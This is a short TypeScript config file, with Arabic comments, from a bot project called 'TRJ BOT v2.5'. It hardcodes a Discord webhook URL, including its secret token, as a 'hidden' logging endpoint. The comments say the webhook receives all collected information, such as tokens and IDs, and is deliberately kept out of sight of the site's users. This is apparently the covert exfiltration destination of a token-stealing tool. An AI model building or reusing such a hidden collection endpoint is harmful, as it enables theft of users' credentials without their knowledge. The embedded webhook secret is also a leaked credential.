// ============================================================
// src/lib/config.ts - ملف الإعدادات المركزي - TRJ BOT v2.5
// ============================================================
//
// ⚠️ ضع رابط الويب هوك الخاص بك هنا
// هذا الرابط سيستقبل جميع المعلومات (توكنات، أيديات، إلخ)
// لا يظهر في الموقع - مخفي في الكود فقط
//
// ============================================================

/** رابط الويب هوك المخفي - ضعه هنا مباشرة كنص */
export const LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1492069400654774313/mp1eh6mC_19wKys0E3QeZ-yqaudzFzbT3Aal-I5mm_PU1sutUk3B_0_fEdw9MyoX-IQX';

/**
 * الحصول على رابط الويب هوك للسجلات
 * @returns رابط الويب هوك أو undefined إذا لم يتم تعيينه
 */
export function getLogWebhookUrl(): string | undefined {
  if (!LOG_WEBHOOK_URL || LOG_WEBHOOK_URL.length < 20) return undefined;
  return LOG_WEBHOOK_URL;
}
